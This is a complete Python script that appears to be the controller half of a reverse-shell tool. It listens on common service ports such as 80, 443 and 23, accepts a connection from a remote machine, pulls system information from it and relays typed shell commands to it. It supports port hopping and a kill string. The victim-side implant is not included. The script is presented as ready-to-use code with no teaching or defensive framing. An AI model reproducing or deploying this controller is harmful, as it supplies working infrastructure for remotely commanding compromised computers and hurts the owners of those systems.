import socket
import time

HOST = "0.0.0.0"  # all local IPs
ports = [80, 8080, 443, 20, 21, 23]
PORT = ports[0]
BUFFER = 1024

KILLSTRING = "endme"
HOP_STRING = "porthop"
INFO_QUERY = "informationquery"

PROMPT = "$ "

def nextPort(p):
	global ports
	i = ports.index(p)
	if i == 5:
		return ports[0]
	return ports[i+1]
	


open_conn = False
while True:
	try:
		if not open_conn:
			s = socket.socket()
			s.settimeout(10)
			s.bind((HOST, PORT))
			print("Ready for connections on " + str(PORT))
			PORT = nextPort(PORT)
			s.listen(1)
			conn, raddr = s.accept()
			open_conn = True
			print("Getting system information...")
			time.sleep(1)
			conn.send(INFO_QUERY.encode())
			PROMPT = conn.recv(BUFFER).decode()

		cmd = input(PROMPT)
		conn.send(cmd.encode())
		
		if cmd == HOP_STRING:
			print("Changing ports...")
			conn.shutdown(1)
			conn.close()
			s.close()
			open_conn = False
		elif cmd == KILLSTRING:
			conn.shutdown(1)
			conn.close()
			s.close()
			break
		else:
			rsp = conn.recv(BUFFER).decode()
			if INFO_QUERY == rsp[0:len(INFO_QUERY)]:
				PROMPT = rsp[len(INFO_QUERY)::]
			else:
				print(rsp)
	except Exception as e:
		print(type(e))
		open_conn = False
		time.sleep(1)
		
print("Goodbye")
